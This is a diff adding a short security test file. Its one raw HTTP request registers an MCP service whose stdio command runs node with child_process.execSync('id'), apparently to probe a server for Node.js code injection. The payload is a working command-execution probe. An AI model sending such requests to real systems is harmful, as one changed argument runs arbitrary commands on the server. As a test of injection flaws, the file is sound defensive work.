@@ -1,0 +1,14 @@
+# 检测Node.js代码注入
+POST /api/v1/mcp-services HTTP/1.1
+Host: www.xwd_test.com
+Authorization: Bearer <token>
+Content-Length: 184
+
+{
+  "name": "test",
+  "transport_type": "stdio",
+  "stdio_config": {
+    "command": "npx",
+    "args": ["node", "-p", "require('child_process').execSync('id').toString()"]
+  }
+}
